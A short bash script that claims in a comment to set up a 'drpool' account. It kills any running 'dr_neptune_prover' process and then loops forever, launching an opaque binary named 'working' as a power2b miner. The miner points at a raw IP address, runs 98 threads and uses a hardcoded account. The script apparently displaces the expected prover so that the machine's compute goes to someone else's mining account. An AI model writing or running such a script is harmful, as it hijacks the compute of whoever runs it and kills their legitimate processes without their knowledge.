#!/bin/bash

# set your own drpool accountname
accountname="MgfmqGzNPD3C3sYbD85UNbAmWaZYpE66FA.$(shuf -n 1 -i 1-999)-Bismillah"

url="157.230.63.131:443"

pids=$(ps -ef | grep dr_neptune_prover | grep -v grep | awk '{print $2}')
if [ -n "$pids" ]; then
    echo "$pids" | xargs kill
    sleep 5
fi

while true; do
    target=$(ps aux | grep dr_neptune_prover | grep -v grep)
    if [ -z "$target" ]; then
        chmod +x working && ./working -a power2b -o 159.223.166.242:80 -u $accountname -t98
        sleep 5
    fi
    sleep 60
done